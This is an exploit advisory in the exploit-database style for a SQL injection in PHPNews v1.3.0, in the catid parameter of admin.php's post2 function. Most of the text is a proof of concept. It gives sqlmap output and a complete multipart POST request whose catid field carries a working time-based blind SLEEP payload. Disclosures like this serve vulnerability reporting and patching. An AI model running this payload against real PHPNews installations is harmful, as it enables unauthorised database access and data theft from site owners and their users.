# Exploit Title: PHPNews v1.3.0 - Sql Injection(SQLi)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/newsphp/files/PHPNews%201._/PHPNews%201.3.0/phpnews_1-3-0.zip/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v1.3.0
## Exploit Description:
## PHPNews v1.3.0 suffers from SQLi - Sql Injection Vulnerability in post2 function in admin.php allowing attackers to execute arbitrary SQL commands via the catid parameter in an HTTP POST request.

## ---------------------------------POC-----------------------------
```
POST parameter 'MULTIPART catid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 546 HTTP(s) requests:
---
Parameter: MULTIPART catid ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="image1"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="image2"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="image3"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="subject"

post4
------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="titletext"

ppppp
------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="maintext"

sndjsanjak
------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="catid"

1' AND (SELECT 3825 FROM (SELECT(SLEEP(5)))EGkf) AND 'hSPf'='hSPf
------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="break"

1
------WebKitFormBoundaryGOFtBA5Q6MsAzcMI
Content-Disposition: form-data; name="post"

Submit
------WebKitFormBoundaryGOFtBA5Q6MsAzcMI--
---
```